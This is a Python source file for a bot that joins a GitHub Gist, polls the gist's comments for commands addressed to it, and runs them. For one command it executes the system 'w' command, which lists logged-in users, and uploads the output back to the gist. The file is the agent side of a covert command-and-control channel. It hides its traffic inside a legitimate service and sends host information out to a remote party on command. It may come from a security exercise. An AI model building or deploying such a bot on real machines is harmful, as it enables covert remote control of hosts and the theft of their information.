import requests
import subprocess
import os
import sys
import commands as cmd
from time import sleep
from dotenv import load_dotenv


class Bot:
    def __init__(self, gist_id, name):
        self.gist_id = gist_id
        self.name = name
        self.headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + os.getenv("GITHUB_API_TOKEN"),
            "X-GitHub-Api-Version": "2022-11-28",
        }

    def run(self):
        print("Running as %s" % self.name)
        if not self.name_available():
            print("Bot name is not available")
            exit(1)
        self.login()
        self.listen()

    def listen(self):
        last_tag = None
        headers = self.headers.copy()
        while True:
            if last_tag is not None:
                headers.update({"If-None-Match": last_tag})
            res = requests.get(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id + "/comments", headers=headers)
            if res.status_code == 304:
                sleep(1)
                continue
            last_tag = res.headers["ETag"]
            for comment in res.json():
                if comment["body"].startswith(self.name + " ") and not comment["body"].startswith("✅ "):
                    command = comment["body"].replace(self.name + " ", "")
                    print("received command %s" % command)
                    if command == cmd.COMMAND_USERS["command"]:
                        result = subprocess.run(["w"], stdout=subprocess.PIPE)
                        data = {"files": {(self.name + ".txt"): {"content": result.stdout.decode("utf-8")}}}
                        res = requests.patch(
                            os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, json=data, headers=self.headers
                        )
                        if res.status_code != 200:
                            print("Could not update bot file in Gist")
                            print(res.json())
                            exit(1)
                    data = {"body": "✅ " + comment["body"]}
                    res = requests.patch(
                        os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id + "/comments/" + str(comment["id"]),
                        json=data,
                        headers=headers,
                    )
                    if res.status_code != 200:
                        print("Could not update comment in Gist")
                        print(res.json())
                        exit(1)

    def name_available(self):
        res = requests.get(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, headers=self.headers)
        if res.status_code == 200:
            return (self.name + ".txt") not in res.json()["files"]
        else:
            return True

    def login(self):
        data = {"files": {(self.name + ".txt"): {"content": "Hello world!"}}}
        res = requests.patch(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, json=data, headers=self.headers)
        if res.status_code != 200:
            print("Could not create file in Gist")
            print(res.json())
            exit(1)

    def logout(self):
        print("Exiting...")
        data = {"files": {(self.name + ".txt"): None}}
        res = requests.patch(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, json=data, headers=self.headers)
        if res.status_code != 200:
            print("Could not delete file in Gist")
            exit(1)


def main(args):
    load_dotenv()
    if len(args) < 2:
        print("Usage: %s <name>" % args[0])
        exit(1)
    bot_name = "".join(x for x in args[1] if x.isalnum())
    bot = Bot(os.getenv("GIST_ID"), bot_name)
    bot.run()


if __name__ == "__main__":
    main(sys.argv)
